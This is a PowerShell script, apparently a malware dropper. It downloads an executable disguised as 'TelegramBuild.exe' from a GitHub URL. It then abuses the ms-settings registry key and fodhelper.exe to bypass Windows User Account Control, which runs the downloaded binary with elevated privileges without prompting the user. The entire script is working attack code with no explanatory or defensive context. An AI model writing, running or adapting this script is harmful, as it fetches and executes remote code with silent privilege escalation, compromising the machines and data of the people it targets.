# --- Download the file from GitHub ---
$githubUrl = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.exe"
$destinationPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe"

Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath
Start-Sleep -Seconds 4

# Create the registry key
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Start-Sleep -Seconds 3

# Create the 'DelegateExecute' property
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Sleep -Seconds 4

# Set the default command
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\$env:USERNAME\not-existent-yet"
Start-Sleep -Seconds 3

# Copy the executable
Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
Start-Sleep -Seconds 4

# Run fodhelper.exe
Start-Process "fodhelper.exe"
Start-Sleep -Seconds 3
